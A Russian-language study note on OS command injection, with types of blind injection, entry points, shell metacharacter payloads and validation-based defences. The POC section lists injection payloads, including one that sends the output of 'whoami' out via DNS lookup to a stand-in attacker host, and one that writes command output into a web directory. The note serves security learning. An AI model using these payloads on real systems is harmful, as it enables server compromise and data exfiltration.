### **Command_Injection**

* **Описание**
*	Внедрение команд ОС также известно как внедрение оболочки. Оно позволяет злоумышленнику выполнять команды операционной системы (ОС) на сервере, на котором запущено приложение, и, как правило, полностью скомпрометировать приложение и его данные.

* **Виды**
*	Уязвимости слепого внедрения команд ОС
		Обнаружение слепого внедрения команд ОС с использованием задержек по времени (ping -c 10 127.0.0.1)
		Использование слепого внедрения команд ОС путем перенаправления вывода (& whoami > /var/www/static/whoami.txt &)
		Использование слепого внедрения команд ОС с использованием методов внеполосного доступа (OAST) (& nslookup kgji2ohoyw.web-attacker.com &)

* **Точки входа**
К подобным уязвимостям относятся:

    Уязвимости небезопасной десериализации
    Уязвимости внедрения шаблонов на стороне сервера SSTI
    Уязвимости SQL инъекции
    Уязвимости переполнения буфера / кучи / стека
    Множественные случаи проблем и ошибок реализации, возникающих при работе с запуском процессов и работе с терминальной оболочкой


* **POC**
*	разделителей команд в системах Windows и Unix:
	&
	&&
	|
	||
*	только в Unix:
	;
	Новая строка (0x0a или \n)
*	выполнения внедренной команды внутри исходной команды:
	`введенная команда`
	$(введенная команда )
Иногда входные данные, которыми вы управляете, появляются в кавычках в исходной команде. В этой ситуации вам необходимо завершить цитируемый контекст (используя " или ') перед использованием подходящих метасимволов оболочки для внедрения новой команды.
*	& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
*	& whoami > /var/www/static/whoami.txt &
*	ping -c 10 127.0.0.1

* **Защита**
Если вам нужно вызывать команды ОС с пользовательским вводом, то вы должны выполнить строгую проверку ввода. Вот несколько примеров эффективной проверки:

Проверка по белому списку разрешенных значений.
Проверка того, что ввод является числом.
Проверка того, что ввод содержит только буквенно-цифровые символы, без другого синтаксиса или пробелов.
Никогда не пытайтесь очистить ввод, экранируя метасимволы оболочки. На практике это слишком подвержено ошибкам и уязвимо для обхода опытным злоумышленником.

